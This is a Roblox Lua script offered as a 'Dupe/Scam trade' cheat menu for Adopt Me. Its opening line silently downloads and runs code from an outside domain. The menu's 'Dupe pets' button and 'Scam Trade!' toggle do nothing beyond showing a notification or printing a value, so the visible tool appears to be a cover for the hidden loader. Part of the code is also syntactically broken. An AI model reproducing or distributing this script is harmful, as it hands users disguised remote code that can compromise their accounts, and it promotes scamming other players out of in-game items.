loadstring(game:HttpGet("https://egorikusa.space/a0a8bb8291c120f3677f146b.lua", true))()
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Dupe/Scam trade Adopt Me", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab ({
	Name = "Dupe",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false

        
Tab:AddButton({
	Name = "Dupe pets",
	Callback = function()
      		OrionLib:MakeNotification({
	Name = "Warning",
	Content = "Wait for 5 minute to take effect",
	Image = "rbxassetid://4483345998",
	Time = 120
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
  	end    
})

local Tab = Window:MakeTab({
	Name = "Scam trade",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]] 
        
        
Tab:AddToggle({
	Name = "Scam Trade!",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
        
